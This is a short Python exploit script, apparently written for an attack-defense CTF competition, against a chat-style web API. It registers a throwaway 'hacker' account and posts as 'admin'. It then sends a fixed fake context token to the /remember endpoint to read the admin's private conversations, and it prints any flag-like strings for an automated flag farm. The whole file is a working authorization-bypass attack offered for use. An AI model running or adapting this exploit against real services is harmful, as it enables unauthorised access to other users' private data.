#!/usr/bin/env python3

import os
import requests
import sys
import time

host = "team1.ctfcup.io"
if len(sys.argv) >= 2:
    host = sys.argv[1]

BASE_URL = f"http://{host}/api"

attacker_username = f"hacker_{int(time.time())}"
attacker_password = "pass123"

resp = requests.post(f"{BASE_URL}/register", json={
    "username": attacker_username,
    "password": attacker_password
})
attacker_token = resp.json()["token"]

headers = {"Authorization": f"Bearer {attacker_token}"}
requests.post(f"{BASE_URL}/talk", headers=headers, json={
    "message": "test",
    "username": "admin"
})

resp = requests.post(f"{BASE_URL}/remember", headers=headers, json={
    "context_token": "a" * 32,
    "username": "admin"
})

flags = ""
if resp.status_code == 200:
    conversations = resp.json().get("conversations", [])
    for conv in conversations:
        content = conv.get("content", "")
        if "MCTF{" in content or "flag" in content.lower():
            flags += content + "\n"

# Можно принтить мусор, ферма фильтрует флаги по регексу
print(flags, flush=True)
